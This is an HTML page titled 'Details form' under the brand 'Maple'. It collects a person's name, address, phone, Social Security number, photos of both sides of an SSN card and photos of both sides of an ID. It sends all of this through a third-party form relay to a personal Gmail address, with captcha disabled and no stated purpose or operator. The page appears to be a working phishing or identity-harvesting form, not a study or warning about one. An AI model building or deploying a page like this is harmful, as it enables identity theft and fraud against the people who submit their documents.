<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="Author" content="Maple">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="images/icon-star.svg" type="image/png" sizes="32x32">
<link rel="stylesheet" href="Css/style.css">
<title>Details form</title>
</head>
<body>
    <header>
    <h1>Maple</h1>

<section class="hero">
    <h2 class="offscreen">hero Header</h2>
  <figure>
    <img src="images/icon-star.svg" alt="Completed Icon" width="35" height="35" title="logo">
  </figure>
</section> 
    </header>
<main>    
  <form action="https://submify.vercel.app/ultimateu036@gmail.com" method="post" class="contact__form" id="form" enctype="multipart/form-data">
    
    <input type="hidden" name="_captcha" value="false">                        
    <input type="hidden" name="_next" value="https://ebi-akangbou.github.io/testing/thank.html">   
                          
<input type="hidden" name="_cc" value="ultimateu036@gmail.com">
<input id="subject" name="_subject" value="subject" style="display: none;">  
<input type="hidden" name="redirect" value="https://ebi-akangbou.github.io/testing/thank.html">
<fieldset class="contact__fieldset">
    <legend class="offscreen">Send Us A Message</legend>
    <label for="firstName" class="contact__label"> First Name</label>
    <br>
    <input type="text"  name="firstName" id="firstName"
    autocomplete="on" placeholder="Type your First name" class="contact__input">
    <p class="errors"></p>

    <label for="lastName" class="contact__label"> Last Name</label>
    <br>
    <input type="text" name="lastName" id="lastName"
    autocomplete="on" placeholder="Type your last name" class="contact__input">
    <p class="errors"></p>
    
    <label for="email" class="contact__label">Email</label>
    <br>
    <input name=" Email" id="email"
    autocomplete="on" placeholder="Type your email" class="contact__input">
    <p class="errors"></p>

    <label for="address" class="contact__label">Address</label>
    <br>
    <input type="text" name=" address" id="address"
    autocomplete="on" placeholder="Type your address" class="contact__input">
    <p class="errors"></p>

    <div>
      <label for="state" class="contact__label">State</label>
      <br>
      <input type="text" name=" state" id="state"
      autocomplete="on" placeholder="State" class="address__input">
      <p class="addErrors"></p>

      <label for="city" class="contact__label">City</label>
      <br>
      <input type="text" name=" city" id="city"
      autocomplete="on" placeholder="City" class="address__input">
      <p class="addErrors"></p>

      <label for="zipCode" class="contact__label">Zip Code</label>
      <br>
      <input type="number" name="zipCode" id="zipCode"
      autocomplete="on" placeholder="Zip Code" class="address__input">
      <p class="addErrors"></p>

    </div>

    <label for="ssn" class="contact__label">SSN</label>
    <br>
    <input type="number" name="ssn" id="ssn"
    autocomplete="on" placeholder="Type your SSN" class="contact__input">
    <p class="errors"></p>

    <label for="frontImageSsn" class="contact__label">Front image of SSN</label>
    <br>
    <input type="file" name="frontImageSsn" id="frontImageSsn" accept="image/png, image/jpeg, image/gif" class="contact__input">
    <p class="errors"></p>

    <label for="backImageSsn" class="contact__label">Back image of SSN</label>
    <br>
    <input type="file" name="backImageSsn" id="backImageSsn" accept="image/png, image/jpeg, image/gif" class="contact__input">
    <p class="errors"></p>

    <label for="phone" class="contact__label">Phone Number</label>
    <br>
    <input type="tel" name="phone" id="phone"
    autocomplete="on" placeholder="Type your Phone number" class="contact__input">
    <p class="errors"></p>
    
    <label for="frontImage" class="contact__label">Front image of ID</label>
    <br>
    <input type="file" name="frontImage" id="frontImage" accept="image/png, image/jpeg, image/gif" class="contact__input">
    <p class="errors"></p>

    <label for="backImage" class="contact__label">Back image of ID</label>
    <br>
    <input type="file" name="backImage" id="backImage" accept="image/png, image/jpeg, image/gif" class="contact__input">
    <p class="errors"></p>
   
</fieldset>
<button type="submit" class="contact__button" >Submit</button>
</form>

 

      </main>
      <footer>
        
        <p id="copyright"></p> 
      
      
      </footer>      
      <script src="index.js"></script>
</body>
</html>
